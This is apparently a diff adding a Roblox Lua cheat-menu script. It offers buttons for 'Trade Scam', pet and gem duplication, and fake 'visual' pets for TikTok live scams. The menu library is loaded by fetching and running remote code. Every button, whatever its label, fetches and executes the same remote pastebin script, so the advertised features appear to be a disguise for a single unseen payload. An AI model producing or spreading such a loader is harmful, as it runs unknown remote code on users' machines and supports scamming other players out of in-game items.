@@ -1,0 +1,81 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local player = game.Players.localPlayer
+local Window = OrionLib:MakeWindow({Name = "Kropka Fucker V4.9", HidePremium = false, SaveConfig = true, IntoEnable = false})
+
+
+function MakeScriptHub()
+    local Window = OrionLib:MakeWindow({Name = "Kropka Fucker", HidePremium = false, SaveConfig = true, IntroEnable = true, Introtext = "Script Hub"})
+end
+local Tab = Window:MakeTab({
+	Name = "Trade Scam",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Trade Scam",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Dupe Pets",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click here to dupe (only huges/exc).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+local Tab = Window:MakeTab({
+	Name = "Visual Huge Cat",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click to have visual huge cat. (for tiktok live scam or smth).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Gems Dupe",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Click here to dupe your diamonds (you need to buy bank).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+local Tab = Window:MakeTab({
+	Name = "Partner Script",
+	Icon = "rbxassetid://4483345998",
+		PremiumOnly = false
+})
+
+Tab:AddButton({
+    Name = "Visual sign pets (for tiktok live scam or smth).",
+    Callback = function()
+    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+
+      end
+})
+
+
+_G.KickMsg = "You've been kicked for exploiting, please rejoin later."
